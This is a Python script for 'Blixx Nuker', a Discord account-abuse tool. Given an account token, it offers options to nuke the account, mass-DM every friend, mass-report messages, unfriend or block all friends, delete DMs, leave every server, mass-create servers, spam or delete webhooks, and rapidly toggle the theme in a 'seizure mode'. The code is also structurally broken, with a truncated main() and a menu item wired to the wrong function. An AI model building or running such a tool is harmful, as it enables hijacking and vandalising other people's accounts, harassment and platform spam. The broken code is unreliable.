import os
import sys
import fade
import time
import keyboard
import multiprocessing
from colorama import Fore

from util.createServers import *
from util.plugins.common import*
import util.massdm 
import util.info
import util.login
import util.accountNuke
import util.massreport
import util.unfriender
import util.friend_blocker
import util.profilechanger
import util.server_leaver
import util.dmdeleter
import util.seizure
import util.webhookspammer

threads = 3
cancel_key = "ctrl+x"



def main():
    setTitle(f"Blixx Nuker {THIS_VERSION}")
    clear()
    global threads
    global cancel_key

cmd = 'mode 148,35'
os.system(cmd)

banner = """


       :::::::::  :::        ::::::::::: :::    ::: :::    :::          ::::    ::: :::    ::: :::    ::: :::::::::: ::::::::: 
     :+:    :+: :+:            :+:     :+:    :+: :+:    :+:          :+:+:   :+: :+:    :+: :+:   :+:  :+:        :+:    :+: 
    +:+    +:+ +:+            +:+      +:+  +:+   +:+  +:+           :+:+:+  +:+ +:+    +:+ +:+  +:+   +:+        +:+    +:+  
   +#++:++#+  +#+            +#+       +#++:+     +#++:+            +#+ +:+ +#+ +#+    +:+ +#++:++    +#++:++#   +#++:++#:    
  +#+    +#+ +#+            +#+      +#+  +#+   +#+  +#+           +#+  +#+#+# +#+    +#+ +#+  +#+   +#+        +#+    +#+    
 #+#    #+# #+#            #+#     #+#    #+# #+#    #+#          #+#   #+#+# #+#    #+# #+#   #+#  #+#        #+#    #+#     
#########  ########## ########### ###    ### ###    ###          ###    ####  ########  ###    ### ########## ###    ###         
                                                                                                                         """
option = """

#######################################################################################################################################
              
               ╔═════════════════════════╗             ╔═════════════════════════╗             ╔═════════════════════════╗                        
               ║    Token  Infomation    ║             ║    Account Activity     ║             ║    Servers Management   ║  
            ╔═══════════════════════════════╗       ╔═══════════════════════════════╗       ╔═══════════════════════════════╗
            ║   [1] Token Info              ║       ║   [3] Nuke Token              ║       ║   [12] Create Mass Server     ║ 
            ║   [2] Login to Token          ║       ║   [4] Mass Dm                 ║       ║   [13] Server Leaver          ║ 
            ╚═══════════════════════════════╝       ║   [5] Mass Report             ║       ║   [14] Webhook Destroyer      ║   
                                                    ║   [6] Delete Friends          ║       ╚═══════════════════════════════╝  
                                                    ║   [7] Block all Friends       ║ 
                                                    ║   [8] GroupChat Spammer       ║ 
                                                    ║   [9] Profil Changer          ║ 
                                                    ║   [10] Dm Deleter             ║  
                                                    ║   [11] Enable Seizure Mode    ║                                                          
                                                    ╚═══════════════════════════════╝  

#######################################################################################################################################
"""                                                                                                                            
faded_banner = fade.greenblue(banner)
print(faded_banner)

faded_banner = fade.greenblue(option)
print(faded_banner)

choice = input(f"#{Fore.CYAN}:{Fore.GREEN}>> ")
if choice == "1":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        util.info.Info(token)
elif choice == "2":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        util.login.TokenLogin(token)             
elif choice == "3":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        Server_Name = str(
            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}"
            )
        )
        message_Content = str(
            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}"
            )
        )
        if threading.active_count() < threads:
            threading.Thread(
                target=util.accountNuke.Blixx_Nuke,
                args=(token, Server_Name, message_Content),
            ).start()
elif choice == "4":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        message = str(
            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}"
            )
        )
        processes = []
        channelIds = requests.get(
            "https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)
        ).json()
        if not channelIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
            sleep(3)
            main()
        for channel in [channelIds[i : i + 3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(
                target=util.massdm.MassDM, args=(token, channel, message)
            )
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}"
        )
        sleep(1.5)
        main()
elif choice == "5":
        print(
            f"\n{Fore.RED}(the token you input is the account that will send the reports){Fore.RESET}"
        )
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        guild_id1 = str(
            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Server ID: {Fore.RED}"
            )
        )
        channel_id1 = str(
            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Channel ID: {Fore.RED}"
            )
        )
        message_id1 = str(
            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message ID: {Fore.RED}"
            )
        )
        reason1 = str(
            input(
                "\n[1] Illegal content\n"
                "[2] Harassment\n"
                "[3] Spam or phishing links\n"
                "[4] Self-harm\n"
                "[5] NSFW content\n\n"
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Reason: {Fore.RED}"
            )
        )
        if reason1.upper() in ("1", "ILLEGAL CONTENT"):
            reason1 = 0
        elif reason1.upper() in ("2", "HARASSMENT"):
            reason1 = 1
        elif reason1.upper() in ("3", "SPAM OR PHISHING LINKS"):
            reason1 = 2
        elif reason1.upper() in ("4", "SELF-HARM"):
            reason1 = 3
        elif reason1.upper() in ("5", "NSFW CONTENT"):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()
        util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)
elif choice == "6":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        if not requests.get(
            "https://discord.com/api/v9/users/@me/relationships",
            headers=getheaders(token),
        ).json():
            print(f"")
            sleep(3)
            main()
        processes = []
        friendIds = requests.get(
            "https://discord.com/api/v9/users/@me/relationships",
            proxies=proxy(),
            headers=getheaders(token),
        ).json()
        if not friendIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no friends ")
            sleep(3)
            main()
        for friend in [friendIds[i : i + 3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(
                target=util.unfriender.UnFriender, args=(token, friend)
            )
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}"
        )
        sleep(1.5)
        main()
elif choice == "7":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        friendIds = requests.get(
            "https://discord.com/api/v9/users/@me/relationships",
            proxies=proxy(),
            headers=getheaders(token),
        ).json()
        if not friendIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no friends ")
            sleep(3)
            main()
        processes = []
        for friend in [friendIds[i : i + 3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(target=util.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}"
        )
        sleep(1.5)
        main()
elif choice == "8":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        util.info.Info(token)
elif choice == "9":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        print(
            f"""
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Status changer
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Bio changer
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] HypeSquad changer    
                        """
        )
        secondchoice = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Setting: {Fore.RED}"
        )
        if secondchoice not in ["1", "2", "3"]:
            print(f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice")
            sleep(1)
            main()
        if secondchoice == "1":
            status = input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.RED}"
            )
            util.profilechanger.StatusChanger(token, status)

        if secondchoice == "2":
            bio = input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom bio: {Fore.RED}"
            )
            util.profilechanger.BioChanger(token, bio)

        if secondchoice == "3":
            print(
                f"""
{Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
{Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
{Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        """
            )
            thirdchoice = input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Hypesquad: {Fore.RED}"
            )
            if thirdchoice not in ["1", "2", "3"]:
                print(f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice")
                sleep(1)
                main()
            if thirdchoice == "1":
                util.profilechanger.HouseChanger(token, 1)
            if thirdchoice == "2":
                util.profilechanger.HouseChanger(token, 2)
            if thirdchoice == "3":
                util.profilechanger.HouseChanger(token, 3)
elif choice == "10":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        processes = []
        channelIds = requests.get(
            "https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)
        ).json()
        if not channelIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
            sleep(3)
            main()
        for channel in [channelIds[i : i + 3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(target=util.dmdeleter.DmDeleter, args=(token, channel))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}"
        )
        sleep(1.5)
        main()
elif choice == "11":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        print(
            f"{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n"
        )
        SlowPrint(f"{Fore.RED}{cancel_key}{Fore.RESET} at anytime to stop")
        processes = []
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token,))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break
elif choice == "12":
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        count = input(f"{Fore.LIGHTCYAN_EX}Count{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        name = input(f"{Fore.LIGHTCYAN_EX}Name{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        createServers(token=token, count=count, name=name)

elif choice == "13":
        token = input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}"
        )
        validateToken(token)
        if token.startswith("mfa."):
            print(
                f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Just a headsup Hazard wont be able to delete the servers since the account has 2fa enabled"
            )
            sleep(3)
        processes = []
        guildsIds = requests.get(
            "https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)
        ).json()
        if not guildsIds:
            print(f"{Fore.RESET}Damn this guy isn't in any servers")
            sleep(3)
            main()
        for guild in [guildsIds[i : i + 3] for i in range(0, len(guildsIds), 3)]:
            t = threading.Thread(target=util.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(
            f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}"
        )
        sleep(1.5)
        main()

elif choice == "14":
        print(
            f"""
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                        """
        )
        secondchoice = int(
            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.RED}"
            )
        )
        if secondchoice not in [1, 2]:
            print(f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice")
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}"
            )
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f"\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n")
            except Exception as e:
                print(
                    f"{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook"
                )

            input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}"
            )
            main()
        if secondchoice == 2:
            WebHook = input(
                f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}"
            )
            validateWebhook(WebHook)
            Message = str(
                input(
                    f"{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}"
                )
            )
            util.webhookspammer.WebhookSpammer(WebHook, Message)
        

def credits():
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    banner = f"""
                         

    """
    faded_banner = fade.fire(banner)
    for x in faded_banner:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()
    time.sleep(2)
    input("Press any key to continue...")


while True:
    main()